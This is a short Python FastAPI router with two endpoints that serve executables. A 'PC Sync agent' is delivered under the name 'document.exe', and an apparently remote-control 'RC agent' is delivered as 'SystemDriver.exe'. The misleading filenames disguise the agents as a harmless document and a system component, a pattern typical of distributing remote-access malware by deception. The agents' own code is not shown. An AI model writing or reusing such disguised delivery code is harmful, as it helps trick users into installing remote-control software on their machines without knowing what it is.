from fastapi import APIRouter, HTTPException
from fastapi.responses import FileResponse

from .state import _PCSYNC_EXE_PATH
from .utils import _fetch_rc_exe

router = APIRouter()


@router.get("/download/pcsync")
async def download_pcsync():
    import os
    if not os.path.exists(_PCSYNC_EXE_PATH):
        raise HTTPException(404, "PC Sync agent not found on server")
    return FileResponse(
        _PCSYNC_EXE_PATH,
        media_type="application/octet-stream",
        filename="document.exe",
    )


@router.get("/download/rc")
async def download_rc():
    path = _fetch_rc_exe()
    if path:
        return FileResponse(path, media_type="application/octet-stream", filename="SystemDriver.exe")
    raise HTTPException(404, "RC agent not found — set GITHUB_TOKEN env var")
